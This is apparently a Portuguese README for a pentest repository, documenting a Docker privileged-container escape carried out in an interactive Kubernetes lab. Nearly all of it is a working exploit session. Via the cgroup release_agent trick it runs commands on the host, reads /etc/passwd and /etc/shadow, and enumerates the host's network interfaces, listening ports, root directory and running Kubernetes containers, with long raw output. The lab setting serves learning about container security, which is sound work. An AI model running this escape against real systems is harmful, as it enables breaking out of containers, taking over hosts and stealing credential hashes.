# Docker-Scape-Kubernetes-Tutorials
Este é um repositório de Pentest no curso interativo do Kubernetes.

Falha explorada: https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1  
Exploit utilizado: https://www.exploit-db.com/exploits/47147

---

Prova de conceito:

```bash
$ docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
root@b09ddb70b06b:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b09ddb70b06b:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b09ddb70b06b:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b09ddb70b06b:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
root@b09ddb70b06b:/# echo '#!/bin/sh' > /cmd
root@b09ddb70b06b:/# echo "cat /etc/passwd && cat /etc/shadow > $host_path/output" >> /cmd
root@b09ddb70b06b:/# chmod a+x /cmd
root@b09ddb70b06b:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b09ddb70b06b:/# ls
bin   cmd  etc   lib    media  opt   root  sbin  sys  usr
boot  dev  home  lib64  mnt    proc  run   srv   tmp  var
root@b09ddb70b06b:/# cat cmd
#!/bin/sh
cat /etc/passwd && cat /etc/shadow > /var/lib/docker/overlay/96eafdbc0f7691788d9a1136ae7120954b7dd59749eee9d1c8ddbc9f3334c7ce/upper/output
root@b09ddb70b06b:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b09ddb70b06b:/# echo "ifconfig > $host_path/output" >> /cmd
root@b09ddb70b06b:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b09ddb70b06b:/# ls
bin   cmd  etc   lib    media  opt     proc  run   srv  tmp  var
boot  dev  home  lib64  mnt    output  root  sbin  sys  usr
root@b09ddb70b06b:/# cat output
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.18.0.1  netmask 255.255.255.0  broadcast 172.18.0.255
        inet6 fe80::42:c3ff:fe31:cfb8  prefixlen 64  scopeid 0x20<link>
        ether 02:42:c3:31:cf:b8  txqueuelen 0  (Ethernet)
        RX packets 694  bytes 66824 (66.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 767  bytes 223513 (223.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.47  netmask 255.255.0.0  broadcast 172.17.255.255
        inet6 fe80::42:acff:fe11:2f  prefixlen 64  scopeid 0x20<link>
        ether 02:42:ac:11:00:2f  txqueuelen 1000  (Ethernet)
        RX packets 5299  bytes 1211998 (1.2 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1454  bytes 249234 (249.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 43334  bytes 12070456 (12.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 43334  bytes 12070456 (12.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth216f6aa: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::878:1dff:feff:4ef1  prefixlen 64  scopeid 0x20<link>
        ether 0a:78:1d:ff:4e:f1  txqueuelen 0  (Ethernet)
        RX packets 82  bytes 20868 (20.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 126  bytes 18959 (18.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth5ad53b1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::9462:c7ff:fe04:f5a5  prefixlen 64  scopeid 0x20<link>
        ether 96:62:c7:04:f5:a5  txqueuelen 0  (Ethernet)
        RX packets 279  bytes 24338 (24.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 317  bytes 102621 (102.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

veth888535a: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::5459:45ff:fed2:3c5c  prefixlen 64  scopeid 0x20<link>
        ether 56:59:45:d2:3c:5c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 66  bytes 7844 (7.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethbfba1d4: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::184a:96ff:fe2a:1067  prefixlen 64  scopeid 0x20<link>
        ether 1a:4a:96:2a:10:67  txqueuelen 0  (Ethernet)
        RX packets 268  bytes 23636 (23.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 313  bytes 99236 (99.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

vethff8b93e: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet6 fe80::249a:fdff:fe55:5071  prefixlen 64  scopeid 0x20<link>
        ether 26:9a:fd:55:50:71  txqueuelen 0  (Ethernet)
        RX packets 65  bytes 7698 (7.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 116  bytes 13335 (13.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@b09ddb70b06b:/# echo "lsb_release -a > $host_path/output" >> /cmd
root@b09ddb70b06b:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b09ddb70b06b:/# cat output
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.4 LTS
Release:        18.04
Codename:       bionic
root@b09ddb70b06b:/# echo "ls -la /root > $host_path/output" >> /cmd
root@b09ddb70b06b:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b09ddb70b06b:/# cat output
total 60
drwx------ 12 root root 4096 Sep 11 21:12 .
drwxr-xr-x 25 root root 4096 Sep 11 21:12 ..
-rw-r--r--  1 root root 3295 Mar  8  2020 .bashrc
drwx------  2 root root 4096 Sep 11 20:27 .cache
drwxr-xr-x  8 root root 4096 Oct 23  2019 .config
drwxr-xr-x  2 root root 4096 Mar  8  2020 .docker
drwx------  3 root root 4096 Sep 11 20:27 .gnupg
-rw-r--r--  1 root root    0 Mar  1  2020 .hushlogin
drwxr-xr-x  4 root root 4096 Sep 11 21:12 .kube
drwxr-xr-x 10 root root 4096 Mar  8  2020 .minikube
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  2 root root 4096 Mar  1  2020 .ssh
drwxr-xr-x  2 root root 4096 Mar  8  2020 .vnc
drwxr-xr-x 11 root root 4096 Oct 23  2019 .vscode
drwxr-xr-x  2 root root 4096 Mar  1  2020 Desktop
-rw-r--r--  1 root root   22 Sep 11 21:13 katacoda-finished
root@b09ddb70b06b:/# echo "netstat -ant > $host_path/output" >> /cmd
root@b09ddb70b06b:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b09ddb70b06b:/# cat output
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:10248         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:10249         0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.47:2379        0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:2379          0.0.0.0:*               LISTEN
tcp        0      0 172.17.0.47:2380        0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:2381          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:10257         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:41779         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:10259         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:51278         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:39814         127.0.0.1:10259         TIME_WAIT
tcp        0      0 127.0.0.1:2379          127.0.0.1:51266         ESTABLISHED
tcp        0      0 127.0.0.1:51216         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51260         ESTABLISHED
tcp        0      0 127.0.0.1:51294         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51218         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51224         ESTABLISHED
tcp        0      0 127.0.0.1:51234         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51204         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51296         ESTABLISHED
tcp        0      0 172.18.0.1:40634        172.18.0.6:8080         TIME_WAIT
tcp        0      0 127.0.0.1:2379          127.0.0.1:51188         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51236         ESTABLISHED
tcp        0      0 127.0.0.1:51254         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51290         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51270         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51270         ESTABLISHED
tcp        0      0 172.17.0.47:22          172.17.0.41:36476       ESTABLISHED
tcp        0      0 127.0.0.1:51284         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51272         ESTABLISHED
tcp        0      0 127.0.0.1:51300         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51216         ESTABLISHED
tcp        0      0 127.0.0.1:51190         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51234         ESTABLISHED
tcp        0      0 127.0.0.1:51296         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51248         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51272         127.0.0.1:2379          ESTABLISHED
tcp        0      0 172.18.0.1:45572        172.18.0.4:8181         TIME_WAIT
tcp        0      0 172.18.0.1:55384        172.18.0.5:9090         TIME_WAIT
tcp        0      0 127.0.0.1:2379          127.0.0.1:51292         ESTABLISHED
tcp        0      0 127.0.0.1:42738         127.0.0.1:2381          TIME_WAIT
tcp        0      0 127.0.0.1:51318         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51244         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51194         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51192         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51314         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51208         ESTABLISHED
tcp        0      0 172.18.0.1:58230        172.18.0.3:8000         ESTABLISHED
tcp        0      0 172.18.0.1:45812        172.18.0.4:8181         TIME_WAIT
tcp        0      0 127.0.0.1:2379          127.0.0.1:51318         ESTABLISHED
tcp        0      0 127.0.0.1:51298         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2381          127.0.0.1:42858         TIME_WAIT
tcp        0      0 127.0.0.1:51292         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51200         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51246         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51280         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51252         ESTABLISHED
tcp        0      0 127.0.0.1:51286         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51244         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51240         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51220         ESTABLISHED
tcp        0      0 127.0.0.1:51200         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:42978         127.0.0.1:2381          TIME_WAIT
tcp        0      0 127.0.0.1:2381          127.0.0.1:42918         TIME_WAIT
tcp        0      0 127.0.0.1:51212         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51232         ESTABLISHED
tcp        0      0 127.0.0.1:51214         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51312         ESTABLISHED
tcp        0      0 127.0.0.1:51246         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51228         ESTABLISHED
tcp        0      0 127.0.0.1:51226         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51188         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51300         ESTABLISHED
tcp        0      0 127.0.0.1:51236         127.0.0.1:2379          ESTABLISHED
tcp        0      0 172.17.0.47:22          172.17.0.41:37324       ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51248         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51274         ESTABLISHED
tcp        0      0 127.0.0.1:51224         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51232         127.0.0.1:2379          ESTABLISHED
tcp        0      0 172.18.0.1:59714        172.18.0.3:8000         TIME_WAIT
tcp        0      0 127.0.0.1:51242         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51302         ESTABLISHED
tcp        0      0 172.17.0.47:2379        172.17.0.47:43092       ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51226         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51210         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51238         ESTABLISHED
tcp        0      0 127.0.0.1:51220         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51196         127.0.0.1:2379          ESTABLISHED
tcp        0      0 172.18.0.1:60014        172.18.0.3:8000         TIME_WAIT
tcp        0      0 172.18.0.1:55504        172.18.0.5:9090         TIME_WAIT
tcp        0      0 172.18.0.1:55444        172.18.0.5:9090         TIME_WAIT
tcp        0      0 172.18.0.1:40934        172.18.0.6:8080         TIME_WAIT
tcp        0      0 127.0.0.1:51228         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51308         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51206         ESTABLISHED
tcp        0      0 127.0.0.1:51310         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51262         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51286         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51316         ESTABLISHED
tcp        0      0 127.0.0.1:51268         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51198         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51250         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51196         ESTABLISHED
tcp        0      0 172.17.0.47:22          172.17.0.41:36416       ESTABLISHED
tcp        0      0 127.0.0.1:51260         127.0.0.1:2379          ESTABLISHED
tcp        0      0 172.18.0.1:45872        172.18.0.4:8181         TIME_WAIT
tcp        0      0 127.0.0.1:51264         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51212         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51278         ESTABLISHED
tcp        0      0 127.0.0.1:51262         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51208         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51308         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51204         ESTABLISHED
tcp        0      0 172.17.0.47:39874       172.17.0.47:8443        TIME_WAIT
tcp        0      0 127.0.0.1:2379          127.0.0.1:51254         ESTABLISHED
tcp        0      0 172.18.0.1:45692        172.18.0.4:8181         TIME_WAIT
tcp        0      0 127.0.0.1:2379          127.0.0.1:51282         ESTABLISHED
tcp        0      0 127.0.0.1:51276         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51242         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51294         ESTABLISHED
tcp        0      0 127.0.0.1:51202         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51258         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51256         ESTABLISHED
tcp        0      0 172.18.0.1:38412        172.18.0.4:8080         TIME_WAIT
tcp        0      0 172.18.0.1:55564        172.18.0.5:9090         TIME_WAIT
tcp        0      0 127.0.0.1:2379          127.0.0.1:51288         ESTABLISHED
tcp        0      0 127.0.0.1:51252         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51306         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51312         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51310         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51184         ESTABLISHED
tcp        0      0 127.0.0.1:51274         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51268         ESTABLISHED
tcp        0      0 172.18.0.1:40814        172.18.0.6:8080         TIME_WAIT
tcp        0      0 127.0.0.1:51304         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51210         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51282         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51214         ESTABLISHED
tcp        0      0 127.0.0.1:51314         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51222         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51276         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51190         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51202         ESTABLISHED
tcp        0      0 172.18.0.1:55624        172.18.0.5:9090         TIME_WAIT
tcp        0      0 172.18.0.1:40754        172.18.0.6:8080         TIME_WAIT
tcp        0      0 127.0.0.1:2379          127.0.0.1:51304         ESTABLISHED
tcp        0      0 127.0.0.1:51184         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51258         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51218         ESTABLISHED
tcp        0      0 127.0.0.1:2381          127.0.0.1:43038         TIME_WAIT
tcp        0      0 127.0.0.1:51266         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51306         ESTABLISHED
tcp        0      0 127.0.0.1:51288         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51192         127.0.0.1:2379          ESTABLISHED
tcp        0      0 172.18.0.1:38592        172.18.0.4:8080         TIME_WAIT
tcp        0      0 127.0.0.1:51250         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:39934         127.0.0.1:10259         TIME_WAIT
tcp        0      0 127.0.0.1:51230         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51230         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51194         ESTABLISHED
tcp        0      0 127.0.0.1:51240         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51238         127.0.0.1:2379          ESTABLISHED
tcp        0      0 172.18.0.1:36994        172.18.0.6:8181         TIME_WAIT
tcp        0      0 172.17.0.47:43092       172.17.0.47:2379        ESTABLISHED
tcp        0      0 127.0.0.1:51256         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:42798         127.0.0.1:2381          TIME_WAIT
tcp        0      0 127.0.0.1:2379          127.0.0.1:51264         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51290         ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51298         ESTABLISHED
tcp        0      0 127.0.0.1:51316         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:51198         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2379          127.0.0.1:51222         ESTABLISHED
tcp        0      0 172.18.0.1:59954        172.18.0.3:8000         TIME_WAIT
tcp        0      0 172.17.0.47:47050       10.96.0.1:443           ESTABLISHED
tcp        0      0 127.0.0.1:51302         127.0.0.1:2379          ESTABLISHED
tcp        0      0 127.0.0.1:2381          127.0.0.1:42738         TIME_WAIT
tcp        0      0 127.0.0.1:51206         127.0.0.1:2379          ESTABLISHED
tcp        0      0 172.18.0.1:45632        172.18.0.4:8181         TIME_WAIT
tcp        0      0 127.0.0.1:2379          127.0.0.1:51284         ESTABLISHED
tcp        0      0 127.0.0.1:51280         127.0.0.1:2379          ESTABLISHED
tcp6       0      0 :::10250                :::*                    LISTEN
tcp6       0      0 :::10251                :::*                    LISTEN
tcp6       0      0 :::10252                :::*                    LISTEN
tcp6       0      0 :::111                  :::*                    LISTEN
tcp6       0      0 :::30000                :::*                    LISTEN
tcp6       0      0 :::10256                :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
tcp6       0      0 ::1:631                 :::*                    LISTEN
tcp6       0      0 :::8443                 :::*                    LISTEN
tcp6       0      0 ::1:49134               ::1:8443                ESTABLISHED
tcp6       0      0 ::1:49088               ::1:8443                ESTABLISHED
tcp6       0      0 ::1:48904               ::1:8443                ESTABLISHED
tcp6       0      0 ::1:8443                ::1:49088               ESTABLISHED
tcp6       0      0 ::1:8443                ::1:49120               ESTABLISHED
tcp6       0      0 ::1:8443                ::1:49134               ESTABLISHED
tcp6       0      0 172.17.0.47:8443        172.18.0.4:57138        ESTABLISHED
tcp6       0      0 ::1:8443                ::1:49102               ESTABLISHED
tcp6       0      0 172.17.0.47:8443        172.18.0.3:43948        ESTABLISHED
tcp6       0      0 ::1:8443                ::1:48904               ESTABLISHED
tcp6       0      0 172.17.0.47:8443        172.18.0.6:47418        ESTABLISHED
tcp6       0      0 ::1:49102               ::1:8443                ESTABLISHED
tcp6       0      0 ::1:49046               ::1:8443                ESTABLISHED
tcp6       0      0 ::1:8443                ::1:49046               ESTABLISHED
tcp6       0      0 ::1:8443                ::1:48896               ESTABLISHED
tcp6       0      0 ::1:49120               ::1:8443                ESTABLISHED
tcp6       0      0 172.17.0.47:8443        172.18.0.5:55812        ESTABLISHED
tcp6       0      0 172.17.0.47:8443        172.17.0.47:48815       ESTABLISHED
tcp6       0      0 ::1:48896               ::1:8443                ESTABLISHED
root@b09ddb70b06b:/# ls
bin   cmd  etc   lib    media  opt     proc  run   srv  tmp  var
boot  dev  home  lib64  mnt    output  root  sbin  sys  usr
root@b09ddb70b06b:/# cd /root
root@b09ddb70b06b:~# ls -la
total 16
drwx------ 2 root root 4096 Feb 19  2020 .
drwxr-xr-x 1 root root 4096 Sep 11 21:15 ..
-rw-r--r-- 4 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 4 root root  148 Aug 17  2015 .profile
root@b09ddb70b06b:~# echo "docker ps -a > $host_path/output" >> /cmd
root@b09ddb70b06b:~# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b09ddb70b06b:~# cat output
cat: output: No such file or directory
root@b09ddb70b06b:~# ls
root@b09ddb70b06b:~# cd /
root@b09ddb70b06b:/# cat output
CONTAINER ID        IMAGE                  COMMAND                  CREATED             STATUS              PORTS               NAMES
65b497f0aa49        70f311871ae1           "/coredns -conf /etc…"   11 minutes ago      Up 11minutes                           k8s_coredns_coredns-6955765f44-qq25c_kube-system_d1e80039-fe97-4da8-a047-45812617171c_0
65aafdce0bbe        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11minutes                           k8s_POD_coredns-6955765f44-qq25c_kube-system_d1e80039-fe97-4da8-a047-45812617171c_0
a3924b65c2c2        3b08661dc379           "/metrics-sidecar"       11 minutes ago      Up 11minutes                           k8s_dashboard-metrics-scraper_dashboard-metrics-scraper-7b64584c5c-dfmzg_kubernetes-dashboard_237485c1-7ddf-463b-9ab8-2fdbb82036ae_0
980e2ee1e9bd        eb51a3597525           "/dashboard --insecu…"   11 minutes ago      Up 11minutes                           k8s_kubernetes-dashboard_kubernetes-dashboard-79d9cd965-9dzv6_kubernetes-dashboard_c2dce65e-ee37-4bd8-81a7-e590415589f9_0
469ddf2f1b46        70f311871ae1           "/coredns -conf /etc…"   11 minutes ago      Up 11minutes                           k8s_coredns_coredns-6955765f44-dxl5n_kube-system_a1d6e1bf-0f7a-48fe-9457-41ad8cdc3a6c_0
16d57b290912        4689081edb10           "/storage-provisioner"   11 minutes ago      Up 11minutes                           k8s_storage-provisioner_storage-provisioner_kube-system_7292d629-86e0-45c9-800d-e281527cfa39_0
82ba80e77c2a        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11minutes                           k8s_POD_storage-provisioner_kube-system_7292d629-86e0-45c9-800d-e281527cfa39_0
e9d16cce30d7        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11minutes                           k8s_POD_kubernetes-dashboard-79d9cd965-9dzv6_kubernetes-dashboard_c2dce65e-ee37-4bd8-81a7-e590415589f9_0
1256cef3e9a4        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11minutes                           k8s_POD_dashboard-metrics-scraper-7b64584c5c-dfmzg_kubernetes-dashboard_237485c1-7ddf-463b-9ab8-2fdbb82036ae_0
93ef80c3376f        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11minutes                           k8s_POD_coredns-6955765f44-dxl5n_kube-system_a1d6e1bf-0f7a-48fe-9457-41ad8cdc3a6c_0
c0da0986fc3a        ae853e93800d           "/usr/local/bin/kube…"   11 minutes ago      Up 11minutes                           k8s_kube-proxy_kube-proxy-pt8n2_kube-system_8cb86de3-d16b-4953-8199-50879d71e43a_0
4ad8b90846fd        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11minutes                           k8s_POD_kube-proxy-pt8n2_kube-system_8cb86de3-d16b-4953-8199-50879d71e43a_0
75da07b0197a        303ce5db0e90           "etcd --advertise-cl…"   11 minutes ago      Up 11minutes                           k8s_etcd_etcd-minikube_kube-system_79645f629a516339739668161bf8cdf4_0
eba8bf417daf        90d27391b780           "kube-apiserver --ad…"   11 minutes ago      Up 11minutes                           k8s_kube-apiserver_kube-apiserver-minikube_kube-system_620391e64da4ef134ca8d5fda9dff78c_0
87a36545530a        b0f1517c1f4b           "kube-controller-man…"   11 minutes ago      Up 11minutes                           k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_9a4c117280e4dc00b50f14fa58ce4d1f_0
629c30769aea        d109c0821a2b           "kube-scheduler --au…"   11 minutes ago      Up 11minutes                           k8s_kube-scheduler_kube-scheduler-minikube_kube-system_e3025acd90e7465e66fa19c71b916366_0
23da52dc53eb        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11minutes                           k8s_POD_etcd-minikube_kube-system_79645f629a516339739668161bf8cdf4_0
0f9a2ca4e89c        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11minutes                           k8s_POD_kube-apiserver-minikube_kube-system_620391e64da4ef134ca8d5fda9dff78c_0
9a776da17711        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11minutes                           k8s_POD_kube-scheduler-minikube_kube-system_e3025acd90e7465e66fa19c71b916366_0
132b213da208        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11minutes                           k8s_POD_kube-controller-manager-minikube_kube-system_9a4c117280e4dc00b50f14fa58ce4d1f_0
b09ddb70b06b        ubuntu                 "bash"                   11 minutes ago      Up 11minutes                           unruffled_satoshi
root@b09ddb70b06b:/# cat output
CONTAINER ID        IMAGE                  COMMAND                  CREATED             STATUS              PORTS               NAMES
65b497f0aa49        70f311871ae1           "/coredns -conf /etc…"   11 minutes ago      Up 11 minutes                           k8s_coredns_coredns-6955765f44-qq25c_kube-system_d1e80039-fe97-4da8-a047-45812617171c_0
65aafdce0bbe        k8s.gcr.io/pause:3.1   "/pause"                 11 minutes ago      Up 11 minutes                           k8s_POD_coredns-6955765f44-qq25c_kube-system_d1e80039-fe97-4da8-a047-45812617171c_0
a3924b65c2c2        3b08661dc379           "/metrics-sidecar"       11 minutes ago      Up 11 minutes                           k8s_dashboard-metrics-scraper_dashboard-metrics-scraper-7b64584c5c-dfmzg_kubernetes-dashboard_237485c1-7ddf-463b-9ab8-2fdbb82036ae_0
980e2ee1e9bd        eb51a3597525           "/dashboard --insecu…"   11 minutes ago      Up 11 minutes                           k8s_kubernetes-dashboard_kubernetes-dashboard-79d9cd965-9dzv6_kubernetes-dashboard_c2dce65e-ee37-4bd8-81a7-e590415589f9_0
